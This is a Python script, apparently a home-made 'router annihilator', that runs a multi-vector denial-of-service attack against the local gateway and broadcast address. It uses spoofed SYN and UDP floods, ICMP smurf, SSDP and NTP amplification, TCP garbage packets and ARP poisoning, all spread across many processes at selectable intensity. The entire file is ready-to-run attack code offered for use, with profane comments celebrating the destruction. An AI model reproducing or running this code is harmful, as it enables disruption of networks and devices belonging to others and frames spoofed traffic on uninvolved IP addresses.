#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ULTIMATE LAN FUCKER 2026 Edition – eat shit consumer routers
# Requires: scapy, tcpreplay (for sendpfast), root

from scapy.all import *
import multiprocessing as mp
import random
import netifaces
import argparse
import time
import ipaddress
import os
import signal
from collections import Counter

# ────────────────────────────────────────────────
#  CONFIG – tune this shit
# ────────────────────────────────────────────────
THREADS_PER_ATTACK   = 6          # processes per vector (×8 vectors = ~48 cores max useful)
PACKETS_PER_BURST    = 5000       # how many before rebuild / re-random
TARGET_PPS_PER_VECTOR = 8000      # aim – real result depends on hardware
PAYLOAD_SIZE         = 1472       # close to MTU – max pain per packet

# Bigger, better spoof pool
def generate_ip_pool(size=50000):
    return [str(ip) for net in [
        "1.0.0.0/8", "3.0.0.0/8", "5.0.0.0/8", "41.0.0.0/8", "102.0.0.0/8"
    ] for ip in ipaddress.IPv4Network(net).hosts()][:size]  # real-looking IPs

IP_POOL = generate_ip_pool()
PORT_POOL = [7, 19, 53, 123, 161, 1900, 5060, 5353, 11211] + list(range(80, 10000, 777))

# ────────────────────────────────────────────────
#  GLOBAL STATE + STATS
# ────────────────────────────────────────────────
TARGET = BROADCAST = IFACE = None
STOP_EVENT = mp.Event()
stats_counter = mp.Manager().dict()  # attack_name → count

def update_stats(attack_name, count=1):
    with stats_counter._get_lock():
        stats_counter[attack_name] = stats_counter.get(attack_name, 0) + count

# ────────────────────────────────────────────────
#  NETWORK AUTO-DETECT – same but cleaner
# ────────────────────────────────────────────────
def get_local_network():
    print("[*] Hunting local gateway like a fucking animal...")
    gw_list = netifaces.gateways().get('default', {})
    if not gw_list or netifaces.AF_INET not in gw_list:
        raise OSError("No default gateway found – are you even connected?")
    
    gw_info = gw_list[netifaces.AF_INET]
    default_gateway = gw_info[0]
    iface = gw_info[1]
    
    addrs = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
    local_ip = addrs['addr']
    netmask = addrs['netmask']
    
    network = ipaddress.IPv4Network(f"{local_ip}/{netmask}", strict=False)
    broadcast = str(network.broadcast_address)
    
    print(f"[+] Target (gateway)   : {default_gateway}")
    print(f"[+] Broadcast          : {broadcast}")
    print(f"[+] Interface          : {iface} ({local_ip})")
    print(f"[+] CPU cores detected : {mp.cpu_count()}")
    
    return default_gateway, broadcast, iface

# ────────────────────────────────────────────────
#  ATTACK PAYLOAD BUILDERS (pre-build where possible)
# ────────────────────────────────────────────────
def build_syn(base_ip):
    return base_ip / TCP(sport=random.randint(1024,65535),
                         dport=random.choice(PORT_POOL),
                         seq=random.randint(1<<24, (1<<32)-1),
                         flags="S")

def build_udp_garbage(base_ip):
    return base_ip / UDP(sport=random.randint(1024,65535),
                         dport=random.choice(PORT_POOL)) / Raw(RandString(size=PAYLOAD_SIZE))

def build_icmp_smurf():
    return IP(src=TARGET, dst=BROADCAST) / ICMP(type=8) / Raw(RandString(size=PAYLOAD_SIZE))

def build_ssdp_amp():
    payload = (
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST:239.255.255.250:1900\r\n"
        "MAN:\"ssdp:discover\"\r\n"
        "MX:4\r\n"
        "ST:upnp:rootdevice\r\n\r\n"
    ).encode()
    return IP(dst=BROADCAST) / UDP(dport=1900) / Raw(payload)

def build_ntp_amp():
    # Classic monlist (old but still fucks some ancient devices)
    payload = bytes.fromhex("17000100000000000000000000000000"
                            "00000000000000000000000000000000"
                            "00000000000000000000000000000000"
                            "00000000")
    return IP(dst=BROADCAST) / UDP(dport=123) / Raw(payload)

def build_tcp_garbage(base_ip):
    flags = random.choice(["SA", "RA", "PA", "UA"])
    return base_ip / TCP(sport=random.randint(1024,65535),
                         dport=random.choice([80,443,8080]),
                         flags=flags) / Raw(RandString(size=800))

# ────────────────────────────────────────────────
#  GENERIC FLOOD WORKER using sendpfast
# ────────────────────────────────────────────────
def flood_worker(attack_name, pkt_gen_func, pps=TARGET_PPS_PER_VECTOR):
    print(f"[+] Starting {attack_name} @ ~{pps:,} pps")
    
    while not STOP_EVENT.is_set():
        try:
            # Generate fresh batch
            pkts = [pkt_gen_func() for _ in range(PACKETS_PER_BURST)]
            
            # Randomize src IP on each batch (most attacks)
            if "src" in pkts[0][IP].fields:
                for p in pkts:
                    p[IP].src = random.choice(IP_POOL)
            
            sendpfast(pkts,
                      pps=pps,
                      loop=0,           # no internal loop – we control it
                      iface=IFACE,
                      parse_results=False)
            
            update_stats(attack_name, len(pkts))
            
        except Exception as e:
            print(f"[-] {attack_name} crashed: {e}")
            time.sleep(1)

# ────────────────────────────────────────────────
#  STATS PRINTER
# ────────────────────────────────────────────────
def stats_printer():
    old_total = 0
    while not STOP_EVENT.is_set():
        time.sleep(5)
        total = sum(stats_counter.values())
        pps = (total - old_total) / 5
        old_total = total
        
        print(f"[STATS] {total:>12,} pkts total | {pps:>9,.0f} pkt/s | "
              f"Processes alive: {mp.active_children().__len__()}")
        
        for k,v in sorted(stats_counter.items(), key=lambda x: x[1], reverse=True):
            print(f"  {k:22} : {v:>10,}")

# ────────────────────────────────────────────────
#  MAIN LAUNCHER
# ────────────────────────────────────────────────
def launch_destruction(args):
    global TARGET, BROADCAST, IFACE
    TARGET, BROADCAST, IFACE = get_local_network()
    
    print("\n" + "="*70)
    print(f"   LAUNCHING 2026 ROUTER ANNIHILATOR – {args.intensity.upper()} MODE")
    print(f"   Target: {TARGET} • Broadcast: {BROADCAST} • Interface: {IFACE}")
    print("="*70 + "\n")
    
    # Register clean(ish) shutdown
    def shutdown(sig=None, frame=None):
        STOP_EVENT.set()
        print("\n[!] KeyboardInterrupt / SIGTERM – killing workers...")
        time.sleep(1.5)
        os._exit(0)
    
    signal.signal(signal.SIGINT, shutdown)
    signal.signal(signal.SIGTERM, shutdown)
    
    # Start stats
    stats_proc = mp.Process(target=stats_printer, daemon=True)
    stats_proc.start()
    
    # Attack definitions: (name, packet_builder_func, base_dst)
    attacks = [
        ("SYN-FLOOD",       lambda: build_syn(IP(dst=TARGET)), TARGET),
        ("UDP-GARBAGE",     lambda: build_udp_garbage(IP(dst=TARGET)), TARGET),
        ("ICMP-SMURF",      build_icmp_smurf, BROADCAST),
        ("SSDP-AMP",        build_ssdp_amp, BROADCAST),
        ("NTP-AMP",         build_ntp_amp, BROADCAST),
        ("TCP-GARBAGE",     lambda: build_tcp_garbage(IP(dst=TARGET)), TARGET),
        ("ARP-POISON",      lambda: ARP(op=2, psrc=random.choice(IP_POOL),
                                        pdst=TARGET, hwdst="ff:ff:ff:ff:ff:ff"), TARGET),
        # Add more if you hate your network even more...
    ]
    
    processes = []
    
    intensity_mult = {"low": 0.4, "medium": 1.0, "high": 2.2, "insane": 4.0}.get(args.intensity, 1.0)
    
    for name, pkt_func, dst in attacks:
        effective_pps = int(TARGET_PPS_PER_VECTOR * intensity_mult * random.uniform(0.85, 1.15))
        for i in range(THREADS_PER_ATTACK):
            p = mp.Process(target=flood_worker,
                           args=(f"{name}-{i+1}", pkt_func, effective_pps),
                           daemon=True)
            p.start()
            processes.append(p)
    
    print(f"[+] Spawned {len(processes)} destruction processes – pray")
    print("[+] Press Ctrl+C to (try to) stop the carnage\n")
    
    # Keep main alive
    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        shutdown()

# ────────────────────────────────────────────────
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="LAN/ROUTER FUCKER 2026")
    parser.add_argument("-i", "--interface", help="force interface")
    parser.add_argument("-I", "--intensity", default="high",
                        choices=["low", "medium", "high", "insane"],
                        help="destruction level (default: high)")
    args = parser.parse_args()
    
    if args.interface:
        IFACE = args.interface
    
    if os.geteuid() != 0:
        print("[!] You forgot sudo motherfucker – run with root")
        exit(1)
    
    launch_destruction(args)
